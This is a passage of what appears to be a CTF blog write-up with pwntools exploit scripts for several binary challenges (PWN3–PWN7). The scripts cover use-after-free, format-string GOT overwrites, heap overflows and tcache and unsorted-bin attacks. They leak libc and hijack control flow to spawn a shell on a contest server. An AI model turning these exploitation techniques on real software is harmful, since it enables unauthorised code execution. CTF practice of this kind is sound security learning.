class="number">4</span>) + p32(system) + p32(<span class="number">0</span>) + p32(sh)</span><br><span class="line"></span><br><span class="line">r.sendline(payload3)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN3"><a href="#PWN3" class="headerlink" title="PWN3"></a>PWN3</h2><p>UAF</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote("219.219.61.234",10002)</span></span><br><span class="line">r = process(<span class="string">"./pwn3"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x8048986</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"AAAA"</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">"BBBB"</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x8</span>,p32(magic))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN4-fail"><a href="#PWN4-fail" class="headerlink" title="PWN4(fail)"></a>PWN4(fail)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn4'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10003'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'a'</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">key = <span class="string">'3xpL0r3R'</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(str(key))</span><br><span class="line">payload = <span class="string">'aaaa%77$p'</span><span class="comment">#6</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaa0x'</span>)</span><br><span class="line">libc_base = int(int(sh.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x20840</span>)</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">puts_addr = libc_base + libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line">gad_get = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">one_addr = libc_base + gad_get[<span class="number">0</span>]</span><br><span class="line">log.success(hex(one_addr))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;puts_got:one_addr&#125;)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN5-fail"><a href="#PWN5-fail" class="headerlink" title="PWN5(fail)"></a>PWN5(fail)</h2><p>淦 这个题我以为给的libc就能用 没想到用的是本机的libc简直血亏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10004</span>)</span><br><span class="line"><span class="comment">#r = process("./pwn5")</span></span><br><span class="line">heap = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    <span class="comment">#r.recvuntil(":")</span></span><br><span class="line">    <span class="comment">#r.sendline(name)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = heap.got[<span class="string">'free'</span>]</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'AAAA'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">'AAAA'</span>) <span class="comment">#1</span></span><br><span class="line">change(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">'A'</span>*<span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x20</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"OK!"</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr -libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr:'</span>+hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">print(hex(system_addr))</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,p64(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#print(hex(heap.got['free']))</span></span><br><span class="line"><span class="comment">#add(0x10,"/bin/sh\x00")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#delete(2)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN6-fail"><a href="#PWN6-fail" class="headerlink" title="PWN6(fail)"></a>PWN6(fail)</h2><p>exp1:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./pwn6'</span>)</span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line">context.log_level = <span class="string">'info'</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="comment">#idx </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recvuntil(<span class="string">'size&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recvuntil(<span class="string">'name&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> <span class="comment">#sh.recvuntil('dele success')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recvuntil(<span class="string">'Choice&gt;&gt; '</span>)</span><br><span class="line"> sh.sendline(<span class="string">'5'</span>)</span><br><span class="line"> sh.recvuntil(<span class="string">"index&gt;&gt; "</span>)</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#leave message at bss</span></span><br><span class="line">sh.recvuntil(<span class="string">'secret\n'</span>)</span><br><span class="line">sh.sendline(<span class="string">'aaa'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#overwrite</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x130</span>, <span class="string">'aa'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>, <span class="string">'aa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">'aaaaaaa'</span>)<span class="comment">#edit this to ....</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'aaaaaaa\x0a'</span>)</span><br><span class="line"><span class="comment">#sh.recv(8)</span></span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4ca8</span></span><br><span class="line">free_addr = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">malloc_addr = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">log.success(hex(free_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#hide on 0</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)<span class="comment">#h</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x98</span>,<span class="string">'aaa'</span>)</span><br><span class="line"><span class="comment">#x/30gx 0x602120 </span></span><br><span class="line"><span class="comment">#bss_ptr</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x88</span> * <span class="string">'a'</span> + <span class="string">'\xb1'</span>)<span class="comment">#</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x88</span>,<span class="string">'aaa'</span>)<span class="comment">#</span></span><br><span class="line">payload1 = <span class="number">0x20</span> * <span class="string">'a'</span> + <span class="string">'\x98'</span> + <span class="number">7</span> * <span class="string">'\x00'</span> + p64(free_addr)</span><br><span class="line">edit(<span class="number">8</span>,payload1)</span><br><span class="line"><span class="comment">#one_addr = libc_base + 0x45226 #0x4527a,0xf0364,0xf1207</span></span><br><span class="line">one_addr = libc_base + <span class="number">0x4527a</span></span><br><span class="line">payload2 = p64(one_addr)</span><br><span class="line">edit(<span class="number">4</span>,payload2)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line"><span class="comment"># p = elf.process()</span></span><br><span class="line">p = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10005'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('libc-2.23.so')</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enter</span><span class="params">()</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">"important secret"</span>,<span class="string">"ld1ng"</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">"&gt;&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendlineafter(<span class="string">'size&gt;&gt;'</span>,str(size))</span><br><span class="line"> p.sendlineafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"> p.sendafter(<span class="string">'name&gt;&gt;'</span>,con)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> p.sendlineafter(<span class="string">'Your Choice&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"> p.sendlineafter(<span class="string">'index&gt;&gt;'</span>,str(idx))</span><br><span class="line">enter()</span><br><span class="line">add(<span class="number">0</span>,<span class="number">128</span>,<span class="string">"aaa"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">128</span>,<span class="string">"bbb"</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - <span class="number">0x10</span> -libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">info(hex(libc_base))</span><br><span class="line">sys = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">info(hex(sys))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>,<span class="string">"ccc"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>,<span class="string">"ddd"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x88</span>,<span class="string">"eee"</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x88</span> + <span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xc8</span>,<span class="string">"fff"</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">16</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x88</span>)+p64(<span class="number">0x602080</span>)+p64(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">"ls"</span>)</span><br><span class="line"><span class="comment"># add(6,0x80,"ld1ng")</span></span><br><span class="line">edit(<span class="number">3</span>,p64(sys))</span><br><span class="line"><span class="comment">#p.sendline("ls")</span></span><br><span class="line"><span class="comment">#p.sendline("cat flag")</span></span><br><span class="line"><span class="comment"># delete(4)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PWN7-fail"><a href="#PWN7-fail" class="headerlink" title="PWN7(fail)"></a>PWN7(fail)</h2><p>&gt;<br>&gt;<br>&gt;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn7")</span></span><br><span class="line">sh = remote(<span class="string">'219.219.61.234'</span>,<span class="string">'10050'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"1"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(size))</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(content))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"2"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(<span class="string">"3"</span>)</span><br><span class="line"> sh.recv()</span><br><span class="line"> sh.sendline(str(idx))</span><br><span class="line"><span class="comment">#step1: 构造出0x200的pre_size</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):<span class="comment">#用到10个块</span></span><br><span class="line"> add(<span class="number">0x80</span>,<span class="string">'a'</span> * <span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):<span class="comment">#六个进入tcahce</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#防止top_chunk合并</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line"> delete(i)<span class="comment">#pre_size分别为0x0,0x100,0x200 （这里合并了）</span></span><br><span class="line"><span class="comment">#到这里全部都free掉了，7个在tcache,3个在unsorted_bin</span></span><br><span class="line"><span class="comment">#step2: 把0x100放入tcache 并由块7进入unsorted_bin提供libc</span></span><br><span class="line"><span class="comment">#另外注意一下idx</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>): <span class="comment">#占满tcache 这里是倒着的 6,5,4,3,2,1，x,x,x,0</span></span><br><span class="line"> add(<span class="number">0x8</span>,p64(i))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">7</span>)) <span class="comment">#切分unsorted_bin</span></span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x8</span>,p64(<span class="number">9</span>)) <span class="comment">#10个分配完毕</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>): <span class="comment">#这里idx=6没有释放 也就是最上面的</span></span><br><span class="line"> delete(i)</span><br><span class="line">delete(<span class="number">8</span>) <span class="comment">#进入tcache 带着0x100</span></span><br><span class="line">delete(<span class="number">7</span>) <span class="comment">#进入unsorted_bin 提供Libc </span></span><br><span class="line">add(<span class="number">0xf8</span>, p64(<span class="number">0</span>)) <span class="comment">#这次分配的是idx=8的B块， 